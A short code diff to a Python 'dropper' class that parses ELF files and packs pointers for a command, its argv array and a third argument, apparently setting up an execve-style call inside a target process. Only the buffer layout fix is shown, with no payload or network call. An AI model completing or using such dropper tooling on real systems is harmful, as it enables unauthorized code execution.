@@ -5,7 +5,6 @@ from elftools.elf import elffile
 import struct
 import pickle
 import math
-
 import pdb
 
 class dropper():
@@ -177,12 +176,14 @@ class dropper():
         first_arg  = ptr
         read_input = self.cmd
         ptr += len(self.cmd)
-        third_arg = ptr
-        read_input += struct.pack(fmt, 0x0)
-        ptr += addr_size
 
         second_arg = ptr
-        ptr += (len(self.argv) + 1) * addr_size
+        read_input += struct.pack(fmt, first_arg)
+        ptr += addr_size
+
+        ptr += (len(self.argv)) * addr_size
+        third_arg = ptr
+        ptr += addr_size
 
         for i, arg in enumerate(self.argv):
             offset = 0
